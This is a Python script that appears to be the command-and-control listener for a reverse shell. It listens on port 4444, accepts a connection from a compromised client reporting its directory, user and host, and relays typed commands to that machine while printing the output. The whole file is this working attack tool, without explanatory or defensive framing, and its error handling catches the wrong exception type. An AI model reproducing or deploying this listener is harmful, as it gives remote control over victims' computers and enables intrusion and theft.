import socket


class bcolors:
    black = "\u001b[30m"
    red = "\u001b[31m"
    green = "\u001b[32m"
    yellow = "\u001b[33m"
    blue = "\u001b[34m"
    magenta = "\u001b[35m"
    cyan = "\u001b[36m"
    white = "\u001b[37m"
    bold = "\u001b[1m"
    underline = "\u001b[4m"
    reset = "\u001b[0m"


SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444
BUFFER_SIZE = 1024 * 128

SEPARATOR = "<sep>"

s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

message = client_socket.recv(BUFFER_SIZE).decode()
cwd, username, hostname = message.split(SEPARATOR)
print("[+] Current working directory:", cwd)

while True:
    prompt = f"{bcolors.bold}{bcolors.cyan}//dev-{bcolors.green}{username}@{hostname}\
        {bcolors.white}:{bcolors.blue}{cwd}{bcolors.white}{bcolors.reset}$"
    command = input(prompt)
    if not command.strip():
        continue
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    output = client_socket.recv(BUFFER_SIZE).decode()
    try:
        results, cwd = output.split(SEPARATOR)
    except IndexError as e:
        print(e)
        results = output
    print(results)
